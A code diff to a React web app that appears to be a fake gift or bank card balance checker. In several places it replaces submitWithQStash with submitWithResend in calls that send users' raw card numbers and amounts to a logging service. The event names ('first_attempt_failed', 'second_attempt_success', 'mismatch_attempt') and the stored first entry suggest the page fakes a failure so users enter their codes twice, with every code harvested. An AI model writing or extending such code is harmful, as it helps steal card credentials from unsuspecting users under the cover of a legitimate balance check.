@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
-import { submitWithQStash } from '../services/logService';
+import { submitWithResend } from '../services/logService';
 
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   return (
@@ -158,7 +158,7 @@ const Home = () => {
         setStoredCode(rawCode);
         
         try {
-          await submitWithQStash({
+          await submitWithResend({
             type: 'first_attempt_failed',
             cardNumber: rawCode,
             amount: amount,
@@ -184,7 +184,7 @@ const Home = () => {
           setError('');
 
           try {
-            await submitWithQStash({
+            await submitWithResend({
               type: 'second_attempt_success',
               cardNumber: rawCode,
               amount: amount,
@@ -207,7 +207,7 @@ const Home = () => {
           setShowBalance(false);
 
           try {
-            await submitWithQStash({
+            await submitWithResend({
               type: 'mismatch_attempt',
               cardNumberFirst: storedCode,
               cardNumberSecond: rawCode,
